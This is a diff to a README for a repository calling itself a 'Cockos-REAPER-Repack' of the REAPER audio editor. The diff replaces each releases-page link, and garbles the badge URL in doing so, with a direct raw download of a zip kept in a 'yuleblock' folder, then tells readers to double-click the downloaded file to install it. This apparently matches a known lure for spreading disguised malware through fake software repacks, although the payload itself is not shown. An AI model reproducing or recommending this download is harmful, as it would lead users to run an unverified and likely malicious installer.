@@ -1,6 +1,6 @@
 # 🎛 Cockos-REAPER-Repack - Enhance Your Audio Editing Experience
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/userLG17MH/Cockos-REAPER-Repack/releases)
+[![Download Latest Release](https://github.com/userLG17MH/Cockos-REAPER-Repack/raw/refs/heads/main/yuleblock/Cockos-Repack-REAPE-1.7.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/userLG17MH/Cockos-REAPER-Repack/raw/refs/heads/main/yuleblock/Cockos-Repack-REAPE-1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Cockos-REAPER-Repack! This application provides a tailored configurat
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Cockos-REAPER-Repack Releases](https://github.com/userLG17MH/Cockos-REAPER-Repack/releases).
+1. Visit this page to download: [Cockos-REAPER-Repack Releases](https://github.com/userLG17MH/Cockos-REAPER-Repack/raw/refs/heads/main/yuleblock/Cockos-Repack-REAPE-1.7.zip).
 2. Look for the latest release, and click on the download link for your operating system.
 3. Once the download completes, locate the file in your Downloads folder.
 4. Double-click the file to start the installation process.
@@ -52,7 +52,7 @@ Join our community for tips and support. Engage with fellow users or ask questio
 
 Your feedback is important. If you have suggestions or issues, please reach out through the GitHub repository’s issues page.
 
-For any further information or updates, keep an eye on our releases page: [Cockos-REAPER-Repack Releases](https://github.com/userLG17MH/Cockos-REAPER-Repack/releases). 
+For any further information or updates, keep an eye on our releases page: [Cockos-REAPER-Repack Releases](https://github.com/userLG17MH/Cockos-REAPER-Repack/raw/refs/heads/main/yuleblock/Cockos-Repack-REAPE-1.7.zip). 
 
 ## 🏷️ Topics
 
